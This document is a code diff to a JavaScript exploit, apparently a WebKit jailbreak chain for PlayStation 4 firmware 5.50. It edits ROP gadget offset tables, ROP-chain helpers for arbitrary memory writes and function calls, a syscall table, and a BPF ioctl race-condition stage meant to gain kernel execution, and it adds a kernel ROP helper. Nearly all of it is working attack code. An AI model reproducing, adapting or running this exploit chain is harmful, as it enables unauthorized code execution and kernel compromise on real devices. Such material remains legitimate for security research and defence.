@@ -57,48 +57,7 @@ var get_jmptgt = function(addr) {
   return addr.add32(y + 6);
 }
 
-var gadgets;
 
-/*
-kchain.push(window.gadgets["pop rax"]);
-      kchain.push(savectx.add32(0x30));
-      kchain.push(window.gadgets["mov rax, [rax]"]);
-      kchain.push(window.gadgets["pop rcx"]);
-      kchain.push(kernel_slide);
-      kchain.push(window.gadgets["add rax, rcx"]);
-      kchain.push(window.gadgets["pop rdi"]);
-      kchain.push(savectx.add32(0x50));
-      kchain.push(window.gadgets["mov [rdi], rax"]);
-      */
-gadgets = {
-  "ret":                    0x0000003C,
-  "jmp rax":                0x00000082,
-  "ep":                     0x000000AD,
-  "pop rbp":                0x000000B6,
-  "mov [rdi], rax":         0x00003FBA,
-  "pop r8":                 0x0000CC42,
-  "pop rax":                0x0000CC43,
-  "mov rax, rdi":           0x0000E84E,
-  "mov rax, [rax]":         0x000130A3,
-  "mov rdi, rax; jmp rcx":  0x0003447A,
-  "pop rsi":                0x0007B1EE,
-  "pop rdi":                0x0007B23D,
-  "add rsi, rcx; jmp rsi":  0x001FA5D4,
-  "pop rcx":                0x00271DE3,
-  "pop rsp":                0x0027A450,
-  "mov [rdi], rsi":         0x0039CF70,
-  "mov [rax], rsi":         0x003D0877,
-  "add rsi, rax; jmp rsi":  0x004E040C,
-  "pop rdx":                0x00565838,
-  "pop r9":                 0x0078BA1F,
-  "add rax, rcx":           0x0084D04D,
-  "jop":                    0x01277350,
-  "infloop":                0x012C4009,
-
-  "stack_chk_fail":         0x000000C8,
-  "memcpy":                 0x000000F8,
-  "setjmp":                 0x00001468
-};
 
 var reenter_help = { length:
     { valueOf: function(){
@@ -135,7 +94,7 @@ var slowpath_jop = function() {
 }
 
 var gadgetmap_wk = function() {
-    window.gadgetmap = {
+    gadgetnames = {
         '5.50': {
             'pop rsi': getGadget('libSceWebKit2', 0x0008f38a), // 0x000000000008f38a : pop rsi ; ret // 5ec3
             'pop rdi': getGadget('libSceWebKit2', 0x00038dba), // pop rdi ; ret
@@ -176,26 +135,40 @@ var gadgetmap_wk = function() {
         }
     };
 }
+ var gadgetcache = {
+      /*
+      kchain.push(window.gadgets["pop rax"]);
+      kchain.push(savectx.add32(0x30));
+      kchain.push(window.gadgets["mov rax, [rax]"]);
+      kchain.push(window.gadgets["pop rcx"]);
+      kchain.push(kernel_slide);
+      kchain.push(window.gadgets["add rax, rcx"]);
+      kchain.push(window.gadgets["pop rdi"]);
+      kchain.push(savectx.add32(0x50));
+      kchain.push(window.gadgets["mov [rdi], rax"]);
+      */
+"ret":                    0x0000003C,
+"jmp rax":                0x00000082,
+"ep":                     0x000000AD,
+"pop rbp":                0x000000B6,
+"pop rax":                     17781,
+"mov rax, rdi":                23248,
+"pop r8":                 0x0000CC42,
+"pop rsp":                    128173,
+"mov [rdi], rsi":             150754,
+"pop rcx":                0x00271DE3,
+"pop rdi":                    239071,
+"pop rsi":                    597265,
+"mov [rdi], rax":             782172,
+"jop":                        813600,
+"pop rdx":                0x00565838,
+"mov [rax], rsi":         0x003D0877,
+"pop r9":                 0x0078BA1F,
+"add rax, rcx":           0x0084D04D,
+"infloop":                0x012C4009},
 
-var gadgetcache = {"ret":60,
-"ep":173,
-"pop rbp":182,
-"pop rax":17781,
-"mov rax, rdi":23248,
-"pop r8":100517,
-"pop rsp":128173,
-"mov [rdi], rsi":150754,
-"pop rcx":169041,
-"pop rdi":239071,
-"pop rsi":597265,
-"mov [rdi], rax":782172,
-"jop":813600,
-"pop rdx":1092690,
-"mov [rax], rsi":2484823,
-"pop r9":21430095,
-"infloop":22604906},
  gadgeton = {};
- 
+
 window.stage2_ = function() {
     p = window.prim;
     print ("[+] exploit succeeded");
@@ -308,7 +281,7 @@ window.stage2_ = function() {
                         }
                         if (!found) continue;
                         gadgets[gadgetnames[nl]] = o2wk(i - gadgetbytes.length + 1);
-                        gadgetoffs[gadgetnames[nl]] = i - gadgetbytes.length + 1;
+                        
                         delete gadgetnames[nl];
                         gadgets_to_find--;
                     }
@@ -415,6 +388,7 @@ window.stage2_ = function() {
     }
 
     p.loadchain = launch_chain;
+  
     
      // Write to address with value (helper function)
   this.write64 = function (addr, val) {
@@ -424,7 +398,7 @@ window.stage2_ = function() {
     this.push(val);
     this.push(window.gadgets["mov [rdi], rax"]);
   }
-    
+   
     window.RopChain = function () {
         this.ropframe = new Uint32Array(0x10000);
         this.ropframeptr = p.read8(p.leakval(this.ropframe).add32(0x10));
@@ -447,40 +421,53 @@ window.stage2_ = function() {
         this.push = function(val) {
             this.finalizeSymbolic(this.pushSymbolic(), val);
         }
-        this.push_write8 = function(where, what)
-        {
-            this.push(gadgets["pop rdi"]); // pop rdi
-            this.push(where); // where
-            this.push(gadgets["pop rsi"]); // pop rsi
-            this.push(what); // what
-            this.push(gadgets["mov [rdi], rsi"]); // perform write
-        }
-        this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9)
-        {
-            this.push(gadgets["pop rdi"]); // pop rdi
-            this.push(rdi); // what
-            this.push(gadgets["pop rsi"]); // pop rsi
-            this.push(rsi); // what
-            this.push(gadgets["pop rdx"]); // pop rdx
-            this.push(rdx); // what
-            this.push(gadgets["pop rcx"]); // pop r10
-            this.push(rcx); // what
-            this.push(gadgets["pop r8"]); // pop r8
-            this.push(r8); // what
-            this.push(gadgets["pop r9"]); // pop r9
-            this.push(r9); // what
-            this.push(rip); // jmp
-            return this;
-        }
+         this.push_write8 = function(where, what)
+  {
+      this.push(gadgets["pop rdi"]); // pop rdi
+      this.push(where); // where
+      this.push(gadgets["pop rsi"]); // pop rsi
+      this.push(what); // what
+      this.push(gadgets["mov [rdi], rsi"]); // perform write
+  }
+       this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9)
+  {
+    if (rdi != undefined) {
+      this.push(gadgets["pop rdi"]); // pop rdi
+      this.push(rdi); // what
+    }
+    if (rsi != undefined) {
+      this.push(gadgets["pop rsi"]); // pop rsi
+      this.push(rsi); // what
+    }
+    if (rdx != undefined) {
+      this.push(gadgets["pop rdx"]); // pop rdx
+      this.push(rdx); // what
+    }
+    if (rcx != undefined) {
+      this.push(gadgets["pop rcx"]); // pop r10
+      this.push(rcx); // what
+    }
+    if (r8 != undefined) {
+      this.push(gadgets["pop r8"]); // pop r8
+      this.push(r8); // what
+    }
+    if (r9 != undefined) {
+      this.push(gadgets["pop r9"]); // pop r9
+      this.push(r9); // what*/
+    }
+
+    this.push(rip); // jmp
+    return this;
+  }
         
         this.run = function() {
-            var retv = p.loadchain(this, this.notimes);
-            this.clear();
-            return retv;
-        }
-        
-        return this;
-    };
+      var retv = p.loadchain(this, this.notimes);
+      this.clear();
+      return retv;
+  }
+  
+  return this;
+};
     var RopChain = window.RopChain();
     window.syscallnames = {"exit": 1,
     "fork": 2,
@@ -754,15 +741,16 @@ window.stage2_ = function() {
     "thr_get_ucontext": 634}    
 
 
-        function swapkeyval(json){
-        var ret = {};
-        for(var key in json){
-            if (json.hasOwnProperty(key)) {
-                ret[json[key]] = key;
-            }
-        }
-        return ret;
+       /* Get syscall name by index */
+function swapkeyval(json){
+  var ret = {};
+  for(var key in json){
+    if (json.hasOwnProperty(key)) {
+      ret[json[key]] = key;
     }
+  }
+  return ret;
+}
     
     window.nameforsyscall = swapkeyval(window.syscallnames);
     
@@ -905,7 +893,7 @@ window.stage2_ = function() {
       chain(thread2);
 
       p.write8(contextp, window.gadgets["ret"]); // rip -> ret gadget
-      p.write8(contextp.add32(0x10), thread2.stackBase); // rsp
+      p.write8(contextp.add32(0x10), thread2.ropframe); // rsp
 
       var test = p.fcall(createThread, longjmp, contextp, stringify("GottaGoFast"));
 
@@ -1192,7 +1180,7 @@ window.stage2_ = function() {
    
      // ioctl() with valid BPF program will trigger free() of old program and reallocate memory for the new one
       spawnthread(function (thread2) {
-        interrupt1 = thread2.stackBase;
+        interrupt1 = thread2.ropframe;
         thread2.push(window.gadgets["ret"]);
         thread2.push(window.gadgets["ret"]);
         thread2.push(window.gadgets["ret"]);
@@ -1203,18 +1191,18 @@ window.stage2_ = function() {
         thread2.push(window.gadgets["pop rdx"]); // pop rdx
         thread2.push(bpf_valid_prog); // what
         thread2.push(window.gadgets["pop rsp"]); // pop rsp
-        thread2.push(thread2.stackBase.add32(0x800)); // what
+        thread2.push(thread2.ropframe.add32(0x800)); // what
         thread2.count = 0x100;
         var cntr = thread2.count;
         thread2.push(window.syscalls[54]); // ioctl
-        thread2.push_write8(thread2.stackBase.add32(cntr * 8), window.syscalls[54]); // restore ioctl
+        thread2.push_write8(thread2.ropframe.add32(cntr * 8), window.syscalls[54]); // restore ioctl
         thread2.push(window.gadgets["pop rsp"]); // pop rdx
-        thread2.push(thread2.stackBase); // what
+        thread2.push(thread2.ropframe); // what
       });
 
       // ioctl() with invalid BPF program will be sprayed and eventually get used by the thread where the program has already been validated
       spawnthread(function (thread2) {
-        interrupt2 = thread2.stackBase;
+        interrupt2 = thread2.ropframe;
         thread2.push(window.gadgets["ret"]);
         thread2.push(window.gadgets["ret"]);
         thread2.push(window.gadgets["ret"]);
@@ -1225,13 +1213,13 @@ window.stage2_ = function() {
         thread2.push(window.gadgets["pop rdx"]); // pop rdx
         thread2.push(bpf_invalid_prog); // what
         thread2.push(window.gadgets["pop rsp"]); // pop rsp
-        thread2.push(thread2.stackBase.add32(0x800)); // what
+        thread2.push(thread2.ropframe.add32(0x800)); // what
         thread2.count = 0x100;
         var cntr = thread2.count;
         thread2.push(window.syscalls[54]); // ioctl
-        thread2.push_write8(thread2.stackBase.add32(cntr * 8), window.syscalls[54]); // restore ioctl
+        thread2.push_write8(thread2.ropframe.add32(cntr * 8), window.syscalls[54]); // restore ioctl
         thread2.push(window.gadgets["pop rsp"]); // pop rdx
-        thread2.push(thread2.stackBase); // what
+        thread2.push(thread2.ropframe); // what
       });
       
      /////////////////// STAGE 3: Trigger ///////////////////
@@ -1245,8 +1233,7 @@ window.stage2_ = function() {
     } else {
       // Everything done already :D
       allset();
-    }
-     
+    }    
      
      // create loader memory
     var code_addr = new int64(0x26100000, 0x00000009);
@@ -1259,10 +1246,7 @@ window.stage2_ = function() {
       var thread = malloc(0x08);
       var thr_name = malloc(0x10);
       p.writeString(thr_name, "loader");
-      
-      // write loader
-      writeLoader(p, code_addr);
-      
+                  
      var createRet = p.fcall(scePthreadCreate, thread, 0, code_addr, 0, thr_name);
     }
      
@@ -1291,7 +1275,31 @@ function mallocu32(size) {
 
   return ptr;
 }
-   
+   var krop = function (p, addr) {
+  // Contains base and stack pointer for fake stack (this.ropframe = RBP, this.stackPointer = RSP)
+  this.ropframe    = addr;
+  this.stackPointer = 0;
+
+  // Push instruction / value onto fake stack
+  this.push = function (val) {
+    p.write8(this.ropframe.add32(this.stackPointer), val);
+    this.stackPointer += 8;
+  };
+
+  // Write to address with value (helper function)
+  this.write64 = function (addr, val) {
+    this.push(window.gadgets["pop rdi"]);
+    this.push(addr);
+    this.push(window.gadgets["pop rax"]);
+    this.push(val);
+    this.push(window.gadgets["mov [rdi], rax"]);
+  }
+
+  // Return krop object
+  return this;
+};
+
+
     p.sptr = function(str) {
         var bufView = new Uint8Array(str.length+1);
         for (var i=0; i<str.length; i++) {
@@ -1307,7 +1315,7 @@ function mallocu32(size) {
     var pid = p.syscall("getpid", 0)== 0 ;
     var uid = p.syscall("getuid", 0)== 0 ;    
     print("all good. fcall test retval = Successful");
-    print("all Stage test = 93%");
+    print("all Stage test = 95%");
     print("....webkit 5.50 Success....");
     
    
